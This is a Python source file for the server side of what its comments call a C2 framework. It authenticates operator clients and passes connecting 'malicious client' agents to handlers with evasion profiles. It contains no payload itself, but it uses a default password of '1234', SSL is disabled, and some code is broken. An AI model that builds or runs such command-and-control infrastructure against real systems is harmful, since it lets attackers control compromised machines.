#!/bin/python3
try:
    import subprocess as sp
    import socket
    import threading
    #import time
    import os
    #import sys
    import random
    import atexit
    from datetime import datetime, timezone
    #import select
    import logging
    import argparse
    #import json
    #import math
    import threading
    import traceback
    import ssl
    import inspect
    import asyncio
    import signal
    import sys
    import time

    # My Modules
    #import json_parser_dev as json_parser

    ## moving off of json_parser
    import DataEngine.JsonHandler as json_parser
    import DataEngine.JsonHandler
    import DataEngine.DataDBHandler

    #from DataEngine.RSAEncryptionHandler import Encryptor ##  Not needed, switching to SSL

    import ClientEngine.ClientHandler
    import ClientEngine.MaliciousClientHandler
    import SecurityEngine.AuthenticationHandler

    import Comms.CommsHandler

    import Utils.UtilsHandler
    import Utils.KeyGen

except Exception as e:
    print(f"[server.py] Import Error: {e}")
    exit()
    #if not continue_anyways():
        #exit()

#import httpserver.httpserver as httpserver


##Reference: https://realpython.com/python-logging/
logging.basicConfig(level=logging.DEBUG)
## Change the path to the system path + a log folder/file somewhere
logging.basicConfig(filename='server.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s', force=True, datefmt='%Y-%m-%d %H:%M:%S')
#if global_debug:
logging.getLogger().addHandler(logging.StreamHandler())
    

################
## Initial Handler
################ 
"""
    This is the first thing that friendly, and malicious clients talk to. 
    
    Flow:
    (this is a loop)
    |                      / if header is !_client_! -> (new thread) ServerMaliciousClientHandler                  \                            |
    | Receive connection -> if HTTP request, redirect to website (in this case, youtube)                             | Else: throw logging.warn | Loop
    | (start_server)       \ if header is !_userlogin_!, login handler -> (new thread) ServerFriendlyClientHandler /                            |
    
"""

class ServerSockHandler():
    def __init__(self, ip = None, port = None, evasion_profile = None, sys_path = None, client_profile = None, function_debug_symbol = "[^]", server_password = "1234"):
        logging.debug(f"[^] {inspect.stack()[0][3]}")
        ## no [*] here, makes it easier to see when the server started
        logging.info(f"===== Startup | Reference Time (UTC) {datetime.now(timezone.utc)} =====")

        ## == Listener settings
        self.ip                     = ip
        self.port                   = port
        self.evasion_profile        = evasion_profile
        self.sys_path               = sys_path
        self.client_profile         = client_profile
        self.function_debug_symbol  = function_debug_symbol
        self.server_password        = server_password


        ##== Clients & lists
        ## These dicts hold the classes
        self.clients    = {}
        self.agents     = {}
        self.current_clients_cookies = {}
        

        ## these lists hold the string repr of the current agetns/clients
        self.current_clients    = []
        self.current_agents     = []

        ## init per-client details. these exist so there are no unknown variable errors later
        self.client_type    = str
        self.client_id      = str
        self.message        = str
        self.action         = str
        self.serversocket   = None
        self.raw_response_from_client = str

        ## Modules
        ## This compiles the JSON schema and returns it
        #bypassing for now. 
        self.json_parser = json_parser.json_ops()

        # generating global priv & pub keys
        #self.encryption = Encryptor(key_length=2048)
        #self.encryption.generate_keys()

        # sanity check that keys got generated
        #print(len(encryption.private_key))
        #print(len(encryption.public_key))

    def start_server_thread(self):
        server_thread = threading.Thread(target=self.start_server, args=(ip, port))
        server_thread.start()

    def start_server(self):
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        """
        Description: This is the starting point for this class, it listens for connections,
        and passes them off to connection_handler()
                        
        ip (str): The IP for the server to listen on
        port (int): The port for the server to listen on
        """
    ##== Initial Connection

        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # this allows the socket to be reelased immediatly on crash/exit
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

            self.ADDR = (self.ip, self.port)
            self.server.bind(self.ADDR)
            ## A cleanup function incase of crash/on exit
            atexit.register(self.socket_cleanup)
            logging.info(f"[*] Server started, and listening: {self.ADDR}")

            ## starting listener
            self.server.listen()
            self.connection_handler()

            ## An expirement... putting the socket in it's own thread to see if this fixes any blocking
            #print("Starting connection_handler_thread")
            #connection_handler_thread = threading.Thread(target=self.connection_handler)
            #connection_handler_thread.daemon = True
            #connection_handler_thread.start()
        
        ##Exceptions: https://docs.python.org/3/library/exceptions.html#TimeoutError
        except TimeoutError as e:
            logging.warning(f"Socket Timeout: \n {inspect.currentframe().f_back}: {e}\n")
        except PermissionError as e:
            logging.warning(f"Socket Permission err \n {inspect.currentframe().f_back}: {e}\n")
        except (ConnectionRefusedError, ConnectionResetError, ConnectionAbortedError) as e:
            logging.warning(f"Con refused \n {inspect.currentframe().f_back}: {e}\n")
        except Exception as e:
            logging.warning(f"{inspect.currentframe().f_back}: {e}\n {e}\n")
                
    def connection_handler(self):
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        """The loop that handles the conections, and passes them off to respective threads/classes
            
        Some notes:
            - This is meant to be run as an infinite listen loop, handling each initial connection before passing it off to its respective threads. If an except is triggered in any function, that
                must return false, as that tells the loop to continue to the next iteration/listening state. There are probably better ways to do this, but for now the return  is simple & works well
            
        """
        ## I kinda wanna name this loop, cascade sounds cool
        while True:#not shutdown_requested:
        ##0 == Reset data 
            self.server_reset_data()

        ##1 == Initial handling of client
            self.server_set_socket()

        ##2 == Parsing the message sent to the server. 
            self.server_parse_message()

        ##3 == Decisions based on parsed messages
            self.server_action_decision()

    def server_reset_data(self):
        '''
        #0
        resets self data to None on each loop.
        '''
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        self.client_id   = None
        self.action      = None
        self.message     = None
        self.client_type = None

    def server_set_socket(self) -> None:
        '''
        #1
        sets self.serversocket to a socket. This is the #1 step when getting a connection from a client/agent
        '''
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

            # Cheap & dirty way to flip SSL on when ready
        SSL = False
        if SSL:
            self.serversocket = self.server_ssl_handler()

        else:
            self.serversocket = self.server_plaintext_handler()
            
        ## catching socket errors
        '''if not self.serversocket:
                continue'''

    def server_parse_message(self):
        '''
        #2
        This is #2 in the chain. It recieves the message via the socket in self.serversocket, and attempts to parse it.
        
        '''
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")
        try:
            # Waiting on client to send followup message
            self.raw_response_from_client = Comms.CommsHandler.receive_msg(conn=self.serversocket)

            ## Converting to json. Validation is disabled during dev.
            response_from_client = self.json_parser.convert_and_validate(self.raw_response_from_client)

            if response_from_client: 
                self.client_type    = response_from_client["general"]["client_type"]
                self.client_id      = response_from_client["general"]["client_id"]
                self.message        = response_from_client["msg"]["msg_command"]
                self.action         = response_from_client["general"]["action"]

                print(f"DEBUG: MSG Breakdown\n\tclient_type:\t {self.client_type}\n\tid:\t\t {self.client_id}\n\tmessage:\t {self.message}\n\taction:\t\t {self.action}\n\n")
            else:
                print("Nothing recieved from client")

        except Exception as e:
            logging.warning(f"[Server.connection_handler()] No message, action, type, or id recieved. , error={e}")
            print(traceback.format_exc())

    def server_action_decision(self):
        '''
        #3

        Enacts actions based on the recieved messages action feild
        
        '''
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        ##== The decision handler based on the client_type, which can be:
            ## !_clientlogin_!: A malicious client "logging" in
            ## !_userlogin_!: A friendly client trying to log in   
            # 
            # Notes: self.serversocket is passed as a LOCAL variable, instead of using the self.serversocket class variable. 
            # Rationale: it's easer to track errors with the <NAME> function using the self. 
                

        ## == Decisions based on parsed messages
        if self.action == "!_userlogin_!":
            print("userlogin")
                    ## If function returns false, continue the loop. IMO that's the easiest way to handle a failure here
            if not self.clientloginhandler(
                request_from_client=self.raw_response_from_client,
                serversocket = self.serversocket):
                        
                print("Placeholder err msg")       

                ## !_client_! handler -- change to AGENT
        elif self.action == "!_clientlogin_!":
            if not self.agentloginhandler(
                serversocket = self.serversocket,
                raw_response_from_client=self.raw_response_from_client,
                agent_id = self.client_id ## this should just be named id... buuut that's a reserved keyword
                ):

                print("Placeholder err msg")       
                #continue

        ## have dedicated functinos for these eventually
        elif any(method in self.client_type for method in ["GET", "HEAD", "POST", "INFO", "TRACE"]): ## sends a 403 denied via web browser/for scrapers
            ## I should capture these too and see whos hitting it
            ## immediatly drop connection, and mayyyybe add to a blocklist, but you could lose legit clients that way
            self.serversocket.close()
            logging.warning("[Server.connection_handler() ] Recieved HTTP Request to C2 server... closing connection")
                    
        else:
            logging.warning(f"[Server.connection_handler() ] Unexpected Connection from {self.client_remote_ip_port}. Action: {self.action} ")
            self.serversocket.close()

    def server_ssl_handler(self) -> socket:
        '''
        This function accepts connections, wraps them in SSL, and returns the SSL enabled socket.
        '''
        try:
            non_ssl_conn, addr = self.server.accept()

        ## Getting client id from the client, and the IP address
            ## this var is only used for printing info, not as any 'real' data
            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
            logging.info(f"\n[{self.client_remote_ip_port} -> Server] Accepted Connection from: {self.client_remote_ip_port}")

        # Wrapping socket into SSL socket
            ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            ssl_context.load_cert_chain(certfile='server.crt', keyfile='server.key')  # Load server's certificate and private key
            ssl_context.verify_mode = ssl.CERT_NONE  # Do not verify the client's certificate, aka self signed
            ssl_socket = ssl_context.wrap_socket(non_ssl_conn, server_side=True)
            
            return ssl_socket
        except ssl.SSLError as ssle:
            '''
             [SSL: SSLV3_ALERT_CERTIFICATE_UNKNOWN] sslv3 alert certificate unknown (_ssl.c:1129)
                - This error comes from browsers connecting to the server. Can't really get past unless you have your own (legit) certs
            
            [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1129)
                - Old SSL or client does not support SSL
                
            '''
            logging.warning(f"[Server.server_ssl_handler() ] SSL Cert Unkown {self.client_remote_ip_port}\n\t Error Message: {ssle}")

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            logging.warning(f"[Server.server_ssl_handler() ] Client {self.client_remote_ip_port} disconnected")
            return False
        except FileNotFoundError as fnfe:
            logging.debug(f"{inspect.currentframe().f_back}: Missing a file, either .CRT or .KEY: {type(e)}")

        except Exception as e:
            logging.debug(f"{inspect.currentframe().f_back} Unkown Error: {type(e)}")
            return False     
  
    def server_plaintext_handler(self) -> socket:
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]} - aka listening again")

        """Handles plaintext communication. It accepts incoming connections, and returns a socket.

        Returns:
            socket: The socket on which the client is communicating on. 
        """
        try:
            non_ssl_conn, addr = self.server.accept()

        ## Getting client id from the client, and the IP address
            ## this var is only used for printing info, not as any 'real' data
            self.client_remote_ip_port = f"{non_ssl_conn.getpeername()[0]}:{non_ssl_conn.getpeername()[1]}"
            logging.info(f"[{self.client_remote_ip_port} -> Server] [New Instance] Accepted Connection from: {self.client_remote_ip_port}")

            return non_ssl_conn

        except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
            logging.warning(f"[Server.server_plaintext_handler() ] Client {self.client_remote_ip_port} disconnected")
            return False
        except FileNotFoundError as fnfe:
            logging.debug(f"{inspect.currentframe().f_back}: Missing a file, either .CRT or .KEY: {type(e)}")

        except Exception as e:
            logging.debug(f"{inspect.currentframe().f_back} Unkown Error: {type(e)}")
            return False

    def socket_cleanup(self):
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        """A cleanup function that is run on any type of exit. it makes sure the socket is closed properly
        & no errors are run into. Left fairly empty for now, may have more use in the future.
            
        Called by start_server
            """
        try:
            ## closing the connection
            self.server.close()
            logging.debug("socket succesfully closed")
        except Exception as e:
            logging.warning(f"Unkown error:{e}")  

    def clientloginhandler(self, request_from_client, serversocket):
        '''
        This function:
            - Sees if a client has logged in before
            - Checks authentication
            - Creates an instance of FriendlyClientHandler.py
            - Puts that instance in a new thread
        
        '''
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        try:
            client_json_dict = DataEngine.JsonHandler.json_ops.from_json(request_from_client)

            auth_type   = client_json_dict["general"]["auth_type"]
            password    = client_json_dict["general"]["auth_value"]
            client_name = client_json_dict["general"]["client_id"]
        except Exception as e:
            logging.debug(f"{inspect.currentframe().f_back}: {e}")
            return False
        
        ## Not doing cookies for now... maybe later.
        if auth_type == "password":
            logging.info("[*] Password Authentication")
            try:
                if SecurityEngine.AuthenticationHandler.Authentication.validate_password(password):
                    cookie = SecurityEngine.AuthenticationHandler.Authentication.generate_random_cookie()

                    if not cookie:
                        logging.info(f"[*] Error with generating cookie!")
                        return False

                    logging.info(f"[*] cookie: {cookie}")

                    ## add cookie to valid cookie class
                    ## need to store it somewhere
                    ## also think about what to name this/what to include

                    ## creating DICT ibject by name of client, assining a class to it
                    self.current_clients_cookies[client_name] = SecurityEngine.AuthenticationHandler.Cookie()
                    
                    ## adding cookie to this specific class
                    self.current_clients_cookies[client_name].cookie = cookie

                    ## debug
                    #print(f"Class object {client_name} cookie: {self.current_clients_cookies[client_name].cookie}")

                    '''IDEA: 
                            Security here - just checks to make sure that the client is the correct client, and not using a hijacked cookie. Maybe use hostname, and or ip/port as a metric for that
                        SecurityEngine.Security.check_client_hash()
                        SecurityEngine.Security.verify_ip() 

                    '''
                    ## if secutiry checks out...
                    ## create json to send back to client
                    cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value=cookie, msg_content="auth_cookie")
                    Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
                    print("[*] cookie sent back")
                    return True
                    ## from here, the client should take the cookie, hold onto it, and send a new request with the cookie in the auth_value feild of json.
                    ## it will then filter down to the 'elif auth_type == "cookie":'

                else:
                    logging.warning(f"[Server.ClientLogonhandler()]: Bad Logon attempt")
                    cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value="Bad Credentials")
                    Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
            except Exception as e:
                logging.debug(f"{inspect.currentframe().f_back}: {e}")
                return False

        elif auth_type == "cookie":
            logging.info("[*] Cookie Authentication")
            try:
                print("cookie auth")


                client_request_cookie = client_json_dict["general"]["auth_value"]
                print("past clinet request cookie")
                #valid_cookie = "classobject_of_client.cookie"

                ## grabbing the cookie sent to the client previously, to verify against
                print(f"Valid cookies dict:\n{self.current_clients_cookies}")

                ## This try/except exists specifically for any bad cookies to throw a proper error
                try:
                    valid_cookie = self.current_clients_cookies[client_name].cookie
                except Exception as e:
                    logging.warning(f'[!] Bad cookie for \'{client_json_dict["general"]["client_id"]}\': \'{client_json_dict["general"]["auth_value"]}\'')
                    cookie_json = DataEngine.JsonHandler.json_ops.to_json_for_client(msg_value="Invalid Cookie")
                    Comms.CommsHandler.send_msg(conn = serversocket, msg = cookie_json)
                    return False

                print("precookie")
                if SecurityEngine.AuthenticationHandler.Authentication.validate_cookie(request_cookie = client_request_cookie, valid_cookie = valid_cookie): 
                    print("pass to ClientHandler...")                    
                    ##security checks too?

                    ## Setting timeout to 5 sec as a test...
                    serversocket.settimeout(5)
                    ## class instance...
                    self.clients[client_name] = ClientEngine.ClientHandler.ClientHandler(
                        request_from_client=request_from_client,
                        client_socket=serversocket
                    )

                    
                    client_thread = threading.Thread(target=self.clients[client_name].handle_client)
                    ## Sets the thread to daemon mode. The hope is to let ctrl + C work
                    client_thread.daemon = True
                    client_thread.start()

            except Exception as e:
                logging.debug(f"{inspect.currentframe().f_back}: {e}")

        else:
            print(f"[ERROR STUFF HERE ] Bad Auth Method attemtped {auth_type}")
            return False
            #logging.warning("[ERROR STUFF HERE ] Bad Auth Method attemtped")'''

    def agentloginhandler(self, serversocket=None, raw_response_from_client=None, agent_id=None):
        logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")

        '''
        raw_response_from_client(str): The raw string from the client. Needed for the MaliciousClientHandler to write to DB. Bandaid Fix

        serversocket: The socket that this connection is held on.

        id=The ID of the client. Note, this is different than the fullname. Ex: WJEIAZ
        

        This function:
            - Sees if a client has logged in before
            - Creates an instance of MaliciousClientHandler.py
            - Puts that instance in a new thread

        Note, if there is an exception, the function returns to continue on with the conn loop.
        

        ## Bulletproofed as of 07/26/2023
        '''
        if agent_id is None:
            logging.debug(f"{inspect.currentframe().f_back} Client ID is None. Returning False to continue with the next loop iteration")
            return False

        try:

            # Construct client name based on its IP and ID (IP & ID help avoid collisions in naming)
            agent_name = "agent_" + serversocket.getpeername()[0].replace(".", "_") + "_" + agent_id#+ agent_id
            '''
            Explanation: 
                English Translation:
                    If the client is not currently in the current client list, add it, and create a
                    new ServerMaliciousClientHandler object for it.

                    If it is, just call the client class instance from the dict (becuase it already exists), 
                    and start a thread with the relevant details. (i.e. the response from the client, the current socket, and the id)

            '''
            if agent_name not in self.current_agents:
                self.current_agents.append(agent_name)

                # Create a new malicious client handler instance and add it to the clients dict
                # sys_path & evasion_profile are both globals. evasion_profile is from argparse, and sys_path is defined at startup
                #print(f"SERVER.PY {sys_path} + {evasion_profile}")

                self.agents[agent_name] = ClientEngine.MaliciousClientHandler.ServerMaliciousClientHandler(sys_path=self.sys_path, evasion_profile_path=self.evasion_profile)

            # Create a new thread for this client's communication.
            # Passing the response from client, the socket, and the id.
            #  
            ## Setting timeout to 5 sec as a test...
            serversocket.settimeout(5)

            threading.Thread(
                target=self.agents[agent_name].handle_client,
                args=(raw_response_from_client, serversocket, agent_id)
                ).start()

            logging.info(f"[Server.agentloginhandler(): {agent_id} ] Client '{agent_id}' accepted, new thread created")

        except KeyError as e:
            logging.debug(f"{inspect.currentframe().f_back} Missing key in login message: {e}")
            return False

        except Exception as e:
            logging.debug(f"{inspect.currentframe().f_back} Unknown Error: {e}")
            raise  # Let the exception propagate, don't return False

        return True

    def value_check(self):
        '''
        The purpose of this function is to make sure things are correct before doing an action
        
        '''
        if self.serversocket == None:
            logging.debug(f"{self.function_debug_symbol} {inspect.stack()[0][3]}")
            logging.warning("Serversocket equals None!")

    def server_startup_actions(self):
        '''
        Functions & stuff to do when the server starts up
        '''
        # init DataDB
        data_db = DataEngine.DataDBHandler.DataSQLDBHandler(db_name="DataDB.db")
        data_db.init_db()
        data_db.stats_set_start_time()

        pass


def signal_handler(sig, frame):
    #global shutdown_requested
    #shutdown_requested = True
    print("\nCtrl+C pressed. Exiting...")
    sys.exit(0)






